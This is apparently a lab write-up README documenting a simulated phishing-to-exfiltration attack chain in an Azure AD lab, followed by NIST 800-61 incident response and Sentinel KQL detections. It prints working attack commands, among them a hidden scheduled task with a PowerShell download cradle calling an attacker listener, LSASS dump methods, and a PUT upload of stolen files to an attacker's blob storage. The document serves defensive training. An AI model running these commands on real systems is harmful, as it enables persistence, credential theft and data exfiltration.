# 🛡️ Episode 08 — Full Attack Simulation & Incident Response

![Microsoft Defender XDR](https://img.shields.io/badge/Microsoft_Defender_XDR-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
![Microsoft Sentinel](https://img.shields.io/badge/Microsoft_Sentinel-0078D4?style=for-the-badge&logo=microsoft&logoColor=white)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-E83E36?style=for-the-badge&logo=mitre&logoColor=white)
![NIST 800-61](https://img.shields.io/badge/NIST_800--61-1A1A2E?style=for-the-badge&logoColor=white)
![Azure](https://img.shields.io/badge/Azure-0089D6?style=for-the-badge&logo=microsoftazure&logoColor=white)

> **Series finale.** A full end-to-end APT-style attack simulation across a multi-VM Active Directory environment, integrating Microsoft Defender for Endpoint, Microsoft Defender for Office 365, Microsoft Sentinel, and Azure Blob Storage. Seven attack phases executed and documented, with formal Incident Response based on NIST 800-61.

---

## 📋 Overview

This is the capstone episode of the **Cybersecurity Lab Series**. Unlike previous episodes that focused on individual tools or techniques, this lab simulates a complete attack chain from phishing delivery to data exfiltration — and then responds to it as a SOC Analyst using the full Microsoft Defender XDR stack.

The attack is modeled after real APT tradecraft: a phishing email delivers a macro-enabled document, establishes persistence via a scheduled task, attempts credential dumping (blocked by MDE), pivots laterally to a file server, collects sensitive files, and exfiltrates them to an attacker-controlled Azure Blob Storage container.

---

## 🏗️ Lab Architecture

| Component | Value |
|---|---|
| Domain | `contoso.local` |
| Tenant | `contoso.onmicrosoft.com` |
| Sentinel Workspace | `law-soc-capstone-xdr` |
| Resource Group | `rg-soc-sentinel` |
| VNet | `10.10.0.0/16` |

| VM | Role | IP |
|---|---|---|
| `vm-soc-dc01` | Domain Controller | `10.10.1.4` |
| `vm-soc-fs01` | File Server (target) | `10.10.1.5` |
| `vm-soc-ws01` | Victim Workstation | `10.10.2.4` |
| `vm-soc-ws02` | Attacker Console / Pivot | `10.10.2.6` |

---

## ⚔️ Attack Chain Summary

```
[Phase 1] Phishing email → jsmith@contoso.onmicrosoft.com
    ↓ macro-enabled .docm attachment
[Phase 2] PowerShell payload executed → Scheduled Task created (persistence)
    ↓ MDE detects and partially blocks
[Phase 3] LSASS dump attempted (3 methods) → ALL BLOCKED by MDE ASR
    ↓ Attack Disruption triggered, ws01 isolated
[Phase 4] Discovery from pivot (ws02) → domain enumeration → fs01 identified
    ↓ Lateral Movement: SMB share mounted (Z:)
[Phase 5] Files staged in C:\Windows\Temp\staging → compressed to .zip
    ↓
[Phase 6] collected_data.zip uploaded to Azure Blob Storage (T1567.002)
    ↓
[Phase 7] IR: Live Response forensics → task removed → device released
```

---

## 🗺️ MITRE ATT&CK Coverage

| Phase | Technique | ID | Status |
|---|---|---|---|
| Initial Access | Spearphishing Attachment | T1566.001 | ✅ Executed |
| Initial Access | User Execution: Malicious File | T1204.002 | ✅ Executed |
| Execution | Command and Scripting: PowerShell | T1059.001 | ✅ Executed |
| Persistence | Scheduled Task/Job | T1053.005 | ✅ Executed |
| Credential Access | OS Credential Dumping: LSASS Memory | T1003.001 | 🚫 Blocked by MDE |
| Defense Evasion | Valid Accounts | T1078 | ✅ Executed |
| Discovery | System Information Discovery | T1082 | ✅ Executed |
| Discovery | System Owner/User Discovery | T1033 | ✅ Executed |
| Discovery | Account Discovery: Local Account | T1087.001 | ✅ Executed |
| Discovery | Permission Groups Discovery: Domain Groups | T1069.002 | ✅ Executed |
| Discovery | System Network Configuration Discovery | T1016 | ✅ Executed |
| Discovery | Remote System Discovery | T1018 | ✅ Executed |
| Discovery | Network Share Discovery | T1135 | ✅ Executed |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 | ✅ Executed |
| Collection | Data Staged: Local Data Staging | T1074.001 | ✅ Executed |
| Collection | Archive Collected Data: Archive via Utility | T1560.001 | ✅ Executed |
| Exfiltration | Exfiltration Over Web Service: Cloud Storage | T1567.002 | ✅ Executed |

---

## 📁 Folder Structure

```
SOC-Lab-Full-Attack-Simulation-Incident-Response/
├── 01-initial-access/
├── 02-execution-persistence/
├── 03-credential-access/
├── 04-discovery-lateral-movement/
├── 05-collection/
├── 06-exfiltration/
├── 07-sentinel-detections/
└── 07-ir-response/
```

---

## 🔴 Phase 1 — Initial Access (T1566.001)

A spearphishing email was sent from an internal account (`IT Support Team`) to the victim user `jsmith@contoso.onmicrosoft.com`, impersonating an urgent security compliance report for Q3 2026.

**Attachment:** `Q3-2026-Security-Compliance-Report.docm`
A macro-enabled Word document containing a PowerShell download cradle that, when macros were enabled, executed a payload hosted on the attacker machine (`vm-soc-ws02:8080`).

**Payload:** `payload.ps1`
A PowerShell script hosted via a local HTTP listener on port 8080. When retrieved and executed, it wrote a confirmation log to `$env:TEMP\syscache.log` and established the foothold for Phase 2.

**MDE Detection:**
- `TrojanDownloader:O97M/Dornoe.A!ams` — macro detected and blocked via AMSI on first attempts
- `Trojan:Win32/ClickFix.Q!ml` — PowerShell execution flagged

**Security Gap Identified:**
MDO Safe Attachments policy (`SOC-Lab8-Safe-Attachments`) was configured but did not sandbox-detonate the attachment because Safe Attachments does not scan intra-org email by default. The `.docm` was delivered to the inbox unscanned.

> 📸 Screenshots: `01-initial-access/`

---

## 🔴 Phase 2 — Execution & Persistence (T1059.001 + T1053.005)

Once the payload executed on `vm-soc-ws01`, it confirmed execution by writing to `syscache.log` (`Execution confirmed: <timestamp> - vm-soc-ws01\admincosta`).

A scheduled task named `WindowsUpdateHealthCheck` was created for persistence:

```powershell
Register-ScheduledTask -TaskName "WindowsUpdateHealthCheck" `
  -Description "Microsoft Windows Update integrity verification" `
  -Action (New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.2.6:8080/beacon.ps1')") `
  -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
  -Settings (New-ScheduledTaskSettingsSet -Hidden) `
  -RunLevel Highest -Force
```

The task was configured as hidden, running at logon, pointing back to the attacker's listener for persistent access.

**Sentinel KQL — Download Cradle Detection:**
```kql
DeviceProcessEvents
| where TimeGenerated > ago(2h)
| where DeviceName contains "vm-soc-ws01"
| where ProcessCommandLine contains "DownloadString"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated desc
```

**Sentinel KQL — Scheduled Task Registry:**
```kql
DeviceRegistryEvents
| where TimeGenerated > ago(2h)
| where DeviceName contains "vm-soc-ws01"
| where RegistryKey contains "Schedule"
| project TimeGenerated, DeviceName, ActionType, RegistryKey, RegistryValueData
| order by TimeGenerated desc
```

> 📸 Screenshots: `02-execution-persistence/`

---

## 🔴 Phase 3 — Credential Access (T1003.001) — BLOCKED

Three LSASS dump methods were attempted on `vm-soc-ws01` to extract credentials:

| Method | Tool | Result |
|---|---|---|
| Task Manager | `taskmgr.exe` → Create dump file | ❌ Blocked by MDE ASR |
| ProcDump | `procdump64.exe -ma lsass.exe` | ❌ Blocked by MDE ASR |
| comsvcs.dll | `[MiniDump]::MiniDumpWriteDump(...)` | ❌ Blocked by Tamper Protection |

**MDE Response:**
MDE triggered **Attack Disruption** automatically, generating a Priority Score 100 incident and isolating `vm-soc-ws01` from the network. Alerts included:
- `An active 'DumpLsass' hacktool in a command line was prevented from executing` (Medium)
- `Hands-on keyboard attack was launched from a compromised machine` (High, Priority 100)
- `Compromised account conducting hands-on-keyboard attack` (Attack Disruption tag)

**Sentinel KQL — LSASS Alert Detection:**
```kql
AlertInfo
| where TimeGenerated > ago(3h)
| where Title contains "Lsass" or Title contains "DumpLsass" or Title contains "credential"
| project TimeGenerated, Title, Severity, AttackTechniques
| order by TimeGenerated desc
```

> 📸 Screenshots: `03-credential-access/`

---

## 🔴 Phase 4 — Discovery & Lateral Movement

Due to MDE restrictions on `vm-soc-ws01` after Attack Disruption, Discovery was conducted from `vm-soc-ws02` acting as the attacker's pivot console. The initial session used a local account (`soclabadmin4`), which was escalated to a domain-context shell via `runas` (T1078).

### Discovery Commands

**Local Reconnaissance (T1082, T1033):**
```cmd
whoami /all
hostname
systeminfo
ipconfig /all
```

**Account & Group Discovery (T1087.001, T1069.002):**
```cmd
net user /domain
net group "Domain Admins" /domain
net localgroup administrators
```
> Note: `net user /domain` initially returned `System error 5 (Access denied)` under the local account. Resolved by switching to a domain-context shell.

**Domain Topology (T1016, T1018):**
```cmd
nltest /dclist:contoso.local
nslookup contoso.local
arp -a
```
> Note: `net view /domain` failed due to the deprecated NetBIOS Browser Service not functioning in Azure VNet environments. Replaced with:
```powershell
([adsisearcher]"(objectClass=computer)").FindAll() | ForEach-Object { $_.Properties.name }
```
> Note: `Get-ADComputer` also failed because the RSAT `ActiveDirectory` module was not installed on `vm-soc-ws02`. The LDAP-based `[adsisearcher]` query required no additional modules and returned all four domain computers.

**Network Share Discovery (T1135):**
```cmd
net view \\vm-soc-fs01
```
> Returned the custom `Shares` disk resource on `vm-soc-fs01`, containing `Finance`, `HR`, and `IT` folders with sensitive decoy files.

### Lateral Movement — SMB Share Mount (T1021.002)

```powershell
net use Z: \\vm-soc-fs01\Shares
dir Z:\ -Recurse
```

The `Shares` folder on `vm-soc-fs01` was mounted as drive `Z:` and confirmed to contain:

```
Z:\Finance\Q3_Budget_Report.txt
Z:\HR\Employee_Salaries_2026.txt
Z:\IT\Network_Credentials_Backup.txt
```

**Security Gap Identified:**
The `Shares` SMB share was configured with `FullAccess "Everyone"`, allowing any authenticated user to read and write without additional privilege escalation.

> 📸 Screenshots: `04-discovery-lateral-movement/`

---

## 🔴 Phase 5 — Collection (T1074.001 + T1560.001)

Files were staged locally on `vm-soc-ws02` under `C:\Windows\Temp\staging` to blend in with legitimate Windows temporary files before archiving.

```powershell
# Stage files from the mounted share
Copy-Item -Path Z:\* -Destination C:\Windows\Temp\staging -Recurse

# Archive into a single ZIP
Compress-Archive -Path C:\Windows\Temp\staging\* `
  -DestinationPath C:\Windows\Temp\collected_data.zip
```

**Result:** `collected_data.zip` confirmed at `1,059 bytes` in `C:\Windows\Temp`.

> 📸 Screenshots: `05-collection/`

---

## 🔴 Phase 6 — C2 & Exfiltration (T1567.002)

`collected_data.zip` was exfiltrated to an attacker-controlled Azure Blob Storage container (`stexfilsoclab / exfil`) using a SAS token for authentication, simulating how threat actors abuse legitimate cloud services to blend exfiltration traffic with normal Azure-bound traffic.

```powershell
Invoke-WebRequest `
  -Uri "https://stexfilsoclab.blob.core.windows.net/exfil/collected_data.zip?<SAS_TOKEN>" `
  -Method PUT `
  -InFile "C:\Windows\Temp\collected_data.zip" `
  -Headers @{"x-ms-blob-type"="BlockBlob"}
```

**Result:** `StatusCode: 201 Created` — blob confirmed visible in the portal at `1.03 KiB`.

**Detection Gap:**
`DeviceNetworkEvents` in Sentinel returned no results for `vm-soc-ws02` during this session. Root cause: the MDE agent (`Sense` service) on `vm-soc-ws02` lost backend connectivity after the NAT Gateway was recreated at the start of the session and had not fully resynchronized by the time exfiltration occurred. Tamper Protection prevented manual service restart. This represents a real-world blind spot: endpoint telemetry gaps during infrastructure changes leave exfiltration activity undetected in the SIEM.

> 📸 Screenshots: `06-exfiltration/`

---

## 🔵 Sentinel Analytics Rules

Three custom Sentinel analytics rules were created and triggered during this simulation:

| Rule Name | Tactic | Technique | Severity |
|---|---|---|---|
| SOC-Lab - Suspicious PowerShell Download Cradle | Execution | T1059.001 | Medium |
| SOC-Lab - Suspicious Scheduled Task Creation | Persistence | T1053.005 | High |
| SOC-Lab - LSASS Memory Access Attempt | Credential Access | T1003.001 | High |

> 📸 Screenshots: `07-sentinel-detections/`

---

## 🔵 Phase 7 — Incident Response (NIST 800-61)

### 1. Preparation
- Microsoft Defender XDR deployed across all endpoints (`vm-soc-ws01`, `vm-soc-dc01`, `vm-soc-fs01`)
- Microsoft Sentinel connected via Defender XDR connector with three custom analytics rules enabled
- MDO Safe Attachments policy configured for `contoso.onmicrosoft.com`
- MDE Live Response enabled for forensic investigation capability

### 2. Detection & Analysis

**First alert:** `Malware incident` — triggered when MDE detected `TrojanDownloader:O97M/Dornoe.A!ams` on `vm-soc-ws01`.

**Timeline:**

| Date | Event |
|---|---|
| Sep 24, 2026 | Phishing email delivered to `jsmith@contoso.onmicrosoft.com` |
| Sep 24, 2026 | Victim opened `.docm` and enabled macros |
| Sep 24, 2026 | Payload executed; `WindowsUpdateHealthCheck` scheduled task created |
| Sep 24, 2026 | MDE detected macro as `Dornoe` and PowerShell as `ClickFix` |
| Sep 29, 2026 | LSASS dump attempted (3 methods); MDE Attack Disruption triggered |
| Sep 29, 2026 | `vm-soc-ws01` automatically isolated by MDE |
| Sep 29, 2026 | Live Response session opened on `vm-soc-ws01` for forensic investigation |
| Sep 29, 2026 | Device released from isolation after forensic documentation |
| Sep 30, 2026 | Discovery, Lateral Movement, Collection, and Exfiltration executed from `vm-soc-ws02` |
| Oct 2, 2026 | `collected_data.zip` confirmed in Azure Blob Storage (`stexfilsoclab/exfil`) |

**Incidents generated in Sentinel:**

| Incident | Priority | Severity | Category |
|---|---|---|---|
| Compromised device (attack disruption) | 100 | High | Execution, Lateral Movement |
| Malware incident | 28 | Low | Malware |
| SOC-Lab - Suspicious PowerShell Download Cradle | 3 | Medium | Execution |

**Live Response forensic artifacts found on `vm-soc-ws01`:**

| Artifact | Path | Significance |
|---|---|---|
| `Q3-2026-Security-Compliance-Report.docm` | `C:\Users\admincosta\Downloads\` | Phishing lure document |
| `Procdump.zip` | `C:\Users\admincosta\Downloads\` | Tool used in LSASS dump attempt |
| `lsass.dmp` | `C:\Users\admincosta\Downloads\` | 0-byte dump (blocked by MDE) |
| `syscache.log` | `C:\Users\admincosta\AppData\Local\Temp\` | Confirmed payload execution |

### 3. Containment, Eradication & Recovery

- `vm-soc-ws01` was automatically isolated by MDE Attack Disruption upon LSASS dump attempt detection
- Live Response session opened to investigate the device without breaking isolation
- Forensic artifacts documented via Live Response (`dir`, `getfile`, `processes`)
- `WindowsUpdateHealthCheck` scheduled task removed to eliminate persistence
- Device released from isolation after confirming threat was contained and documented
- All attacker tools and artifacts identified and documented for eradication

### 4. Post-Incident Activity — Lessons Learned

| Finding | Impact | Recommendation |
|---|---|---|
| Employee opened phishing email and enabled macros | Critical — enabled full attack chain | Security awareness training focused on phishing recognition and macro risks |
| MDO Safe Attachments did not scan intra-org email | High — malicious `.docm` reached inbox unscanned | Enable Safe Attachments for intra-org email; review MDO policy scope |
| MDE telemetry gap on `vm-soc-ws02` after NAT Gateway recreation | High — Phase 6 exfiltration had no SIEM visibility | Verify EDR connectivity after infrastructure changes; monitor `DeviceInfo` heartbeats |
| SMB share configured with `FullAccess "Everyone"` | High — no privilege escalation needed for file access | Apply principle of least privilege to all shared resources |
| 652 Critical CVEs identified on `vm-soc-ws01` | High — large unpatched attack surface | Establish patch management cycle; prioritize CVSS 9.0+ vulnerabilities |

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|---|---|
| Microsoft Defender for Endpoint | EDR, ASR rules, Attack Disruption, Live Response |
| Microsoft Defender for Office 365 | Safe Attachments policy, Threat Explorer |
| Microsoft Sentinel | SIEM, KQL hunting, custom analytics rules |
| Azure Blob Storage | Simulated exfiltration destination (T1567.002) |
| PowerShell | Payload delivery, persistence, discovery, collection, exfiltration |
| Active Directory | Domain environment (`contoso.local`) |
| Azure Bastion | Secure VM access without public IPs |
| Azure NAT Gateway | Outbound internet access for MDE agent connectivity |

---

## 📊 KQL Queries Reference

```kql
// Phase 1 — Download Cradle Detection
DeviceProcessEvents
| where TimeGenerated > ago(2h)
| where DeviceName contains "vm-soc-ws01"
| where ProcessCommandLine contains "DownloadString"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName
| order by TimeGenerated desc

// Phase 2 — Scheduled Task via Registry
DeviceRegistryEvents
| where TimeGenerated > ago(2h)
| where DeviceName contains "vm-soc-ws01"
| where RegistryKey contains "Schedule"
| project TimeGenerated, DeviceName, ActionType, RegistryKey, RegistryValueData
| order by TimeGenerated desc

// Phase 3 — LSASS Alerts
AlertInfo
| where TimeGenerated > ago(3h)
| where Title contains "Lsass" or Title contains "DumpLsass" or Title contains "credential"
| project TimeGenerated, Title, Severity, AttackTechniques
| order by TimeGenerated desc

// All Phases — MITRE Technique Alerts
AlertInfo
| where TimeGenerated > ago(7d)
| where AttackTechniques contains "T1566" or AttackTechniques contains "T1059"
    or AttackTechniques contains "T1053"
| project TimeGenerated, Title, Severity, AttackTechniques
| order by TimeGenerated desc

// Phase 6 — Exfiltration Network Event
DeviceNetworkEvents
| where DeviceName contains "ws02"
| where RemoteUrl contains "blob.core.windows.net"
| project TimeGenerated, DeviceName, RemoteIP, RemoteUrl, InitiatingProcessFileName
| order by TimeGenerated desc
```

---

## 📌 Key Takeaways

1. **A single user action can start a full attack chain.** The victim enabling macros was the only human action required. Everything else was automated.
2. **MDE's Attack Disruption is real.** It automatically isolated the compromised device and blocked all LSASS dump attempts before any manual SOC response was possible.
3. **Configuration gaps matter as much as missing tools.** MDO Safe Attachments was deployed but misconfigured, leaving intra-org phishing unscanned.
4. **SIEM blind spots can be infrastructure-driven.** A NAT Gateway recreation caused MDE telemetry to drop on one endpoint, making the exfiltration phase invisible to Sentinel.
5. **Attackers adapt.** When `net view /domain` and `Get-ADComputer` both failed due to environment constraints, LDAP via `[adsisearcher]` achieved the same result without any additional tooling.

---

## 🔗 Series Index

| Episode | Topic |
|---|---|
| Episode 01 | MDE Threat Simulation |
| Episode 02 | MDO Phishing Simulation |
| Episode 03 | MDI Active Directory Attacks |
| Episode 04 | MDC Cloud Posture Management |
| Episode 05 | Sentinel Analytics Rules & SOAR Automation |
| Episode 06 | Advanced Threat Hunting with KQL |
| Episode 07 | Ransomware Incident Response with NIST 800-61 |
| **Episode 08** | **Full Attack Simulation & Incident Response** ← You are here |

---

*Guillermo Costa — Cybersecurity Analyst*
*[LinkedIn](https://linkedin.com/in/guillermo-costa) · [GitHub](https://github.com/GjcCS)*

`#SOCAnalyst` `#ThreatHunting` `#MicrosoftDefender` `#KQL` `#BlueTeam` `#MITREATTACK` `#IncidentResponse` `#MicrosoftSentinel` `#CyberSecurity`
